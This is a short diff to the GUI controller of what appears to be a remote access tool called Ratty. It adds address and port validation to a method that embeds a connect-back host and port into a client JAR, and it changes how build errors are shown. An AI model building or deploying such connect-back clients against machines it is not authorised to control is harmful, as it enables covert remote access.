@@ -485,12 +485,13 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private void build() {
-		if (selectedFile == null) {
+		final String address = builder.getAddressInput();
+		final String port = builder.getPortInput();
+		
+		if (address == null || port == null || address.isEmpty() || port.isEmpty() || selectedFile == null) {
 			return;
 		}
 		
-		final String address = builder.getAddressInput();
-		final String port = builder.getPortInput();
 		final String dataReplacementString = String.format(BUILDER_DATA_REPLACEMENT_FORMAT, address, port);
 		final byte[] dataReplacement = dataReplacementString.getBytes();
 		
@@ -505,7 +506,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 				JarBuilder.removeFile(selectedFile, removal);
 			}
 		} catch (final IOException ex) {
-			gui.showError(BUILDER_ERROR_MESSAGE + System.lineSeparator() + ex.getMessage());
+			gui.showError(BUILDER_ERROR_MESSAGE + System.lineSeparator() + ex);
 		} finally {
 			builder.setVisible(false);
 		}
